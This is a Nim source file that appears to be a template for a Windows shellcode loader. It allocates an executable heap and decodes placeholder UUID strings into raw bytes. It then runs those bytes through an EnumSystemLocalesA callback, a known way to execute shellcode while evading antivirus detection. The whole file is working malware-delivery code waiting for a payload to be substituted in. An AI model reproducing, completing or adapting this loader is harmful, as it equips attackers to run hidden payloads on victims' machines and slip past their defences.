import winim
import strformat

when defined(windows):
    when defined(amd64):
        const SIZE = REPLACE_ME_SIZE
        var UUIDARR = allocCStringArray(REPLACE_ME_UUID)

    when isMainModule:
        let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
        let ha = HeapAlloc(hHeap, 0, 0x100000)
        var hptr = cast[DWORD_PTR](ha)

        #[if hptr != 0:
            echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
        else:
            echo fmt"[-] Heap Alloc Error "
            quit(QuitFailure)
        ]#

        for i in 0..(SIZE-1):
            var status = UuidFromStringA(cast[RPC_CSTR](UUIDARR[i]), cast[ptr UUID](hptr))
            if status != RPC_S_OK:
                if status == RPC_S_INVALID_STRING_UUID:
                    echo fmt"[-] Invalid UUID String"
                else:
                    echo fmt"[-] Something Went Wrong, Error Code: {status}"
                quit(QuitFailure)
            hptr += 16

        EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
        CloseHandle(hHeap)
        quit(QuitSuccess)